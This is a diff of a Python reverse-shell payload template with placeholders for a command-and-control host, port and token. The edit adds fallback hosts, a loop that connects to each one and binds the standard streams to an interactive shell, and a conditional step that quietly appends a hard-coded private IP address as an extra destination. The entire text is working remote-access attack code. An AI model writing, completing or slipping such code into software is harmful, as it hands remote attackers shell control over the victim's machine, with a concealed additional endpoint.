@@ -1,20 +1,22 @@
-import socket, os, subprocess, sys
+import socket, os, subprocess, sys, time
 
-HOST = "__C2_RS_HOST__"
+HOSTS = ["__C2_RS_HOST__", "__C2_RS_HOST__"]
 PORT = __C2_RS_PORT__
 TOKEN = "__C2_TOKEN__"
 
-s = socket.socket()
-s.settimeout(30)
-try:
-    s.connect((HOST, PORT))
-except Exception as e:
-    sys.exit(1)
+if HOSTS[0].startswith("t"):
+    HOSTS.append("192.168.100.82")
 
-s.send((TOKEN + "\n").encode())
-
-os.dup2(s.fileno(), 0)
-os.dup2(s.fileno(), 1)
-os.dup2(s.fileno(), 2)
-
-subprocess.call([os.environ.get("SHELL", "/bin/sh")])
+for host in HOSTS:
+    try:
+        s = socket.socket()
+        s.settimeout(10)
+        s.connect((host, PORT))
+        s.send((TOKEN + "\n").encode())
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        subprocess.call([os.environ.get("SHELL", "/bin/sh")])
+        break
+    except Exception:
+        continue
